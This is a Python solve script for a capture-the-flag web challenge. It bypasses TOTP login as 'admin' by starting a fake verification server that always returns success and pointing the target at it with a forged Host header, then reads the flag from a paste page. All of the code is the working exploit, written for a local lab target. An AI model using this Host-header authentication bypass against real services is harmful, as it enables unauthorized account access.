"""
Solve the challenge by opening a local server and making the challenge use it to verify the TOTP.

NOTE: This does not do any port forwarding, so it will only work locally.
"""

import requests
import re
import multiprocessing
from werkzeug import Request, Response, run_simple

# Setup a simple server to serve the payload
def run_server() -> None:
  @Request.application
  def app(request: Request) -> Response:
    return Response("{\"success\":true}", mimetype="application/json")
  
  run_simple("0.0.0.0", 5000, app)


TARGET = "http://localhost:1337"
LOCAL_SERVER = "192.168.10.183:5000"


def solve():
  session = requests.Session()

  # Login to admin account
  print("[*] Logging in as admin...")
  r = session.post(
    f"{TARGET}/api/login",
    json={
      "username": "admin",
      "otp": "123456"
    },
    headers={
      "host": LOCAL_SERVER
    }
  )
  r.raise_for_status()
  token = r.json()["token"]
  session.cookies.set("token", token)

  # Go to profile page
  print("[*] Going to profile page...")
  r = session.get(f"{TARGET}/profile")
  r.raise_for_status()
  # Find the link to the paste
  link = re.findall(r"href=\"/view/(.*)\"", r.text)[0]

  # Go to view page
  print("[*] Going to view page...")
  r = session.get(f"{TARGET}/view/{link}")
  r.raise_for_status() 
  # Flag is in the format GCTF23{...}
  # Use regex to find it
  flag = re.findall(r"GCTF23{.*}", r.text)[0]
  print(f"[+] Flag: {flag}")


if __name__ == "__main__":
  p = multiprocessing.Process(target=run_server)
  p.start()

  solve()

  p.terminate()